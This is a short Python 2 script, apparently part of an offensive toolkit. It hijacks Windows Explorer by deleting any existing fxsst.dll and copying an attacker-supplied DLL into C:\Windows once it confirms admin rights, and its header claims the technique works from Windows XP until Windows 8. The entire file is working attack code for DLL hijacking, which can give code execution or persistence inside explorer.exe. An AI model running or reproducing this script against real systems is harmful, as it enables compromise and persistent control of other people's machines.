"""
Works from: Windows XP
Fixed in: Windows 8
"""
import os
import shutil
import ctypes
from colorama import init, Fore
init(convert=True)

dll_name = "fxsst.dll"
dll_drop = "c:\windows"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)

def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	

def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def fax_dll_hijack():
	print " {} fax_dll_hijack: Attempting to copy: {} to: {} in order to dll hijack explorer".format(infoBox(),dll_name,dll_drop)
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} fax_dll_hijack: We are running as admin, we can proceed".format(infoBox())
		
		if (os.path.isfile(os.path.join(dll_drop,dll_name)) == True):
			try:
				os.remove(os.path.join(dll_drop,dll_name))
				print " {} fax_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name,dll_drop)
			except Exception as error:
				print " {} fax_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name,dll_drop)
				return False

		try:
			shutil.copy(dll_name,dll_drop)
			print " {} fax_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,dll_drop)
		except shutil.Error as error:
			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
		except IOError as error:
			print " {} fax_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
	else:
		print " {} fax_dll_hijack: We are not admin, cannot proceed".format(errorBox())
		return False		
